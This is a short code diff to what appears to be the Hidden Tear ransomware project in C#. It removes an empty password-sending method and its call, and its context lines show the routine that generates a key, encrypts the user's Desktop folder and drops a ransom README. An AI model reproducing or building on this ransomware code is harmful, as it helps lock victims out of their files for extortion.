@@ -113,12 +113,6 @@ namespace hidden_tear
             return res.ToString();
         }
 
-        //Sends created password target location
-        public void SendPassword(string password){
-            
-
-        }
-
         //Encrypts single file
         public void EncryptFile(string file, string password)
         {
@@ -170,7 +164,6 @@ namespace hidden_tear
             string password = CreatePassword(40);
             string path = "\\Desktop";
             string startPath = userDir + userName + path;
-            SendPassword(password);
             encryptDirectory(startPath,password);
             messageCreator();
             string txtpath = "\\Desktop\\README.txt";
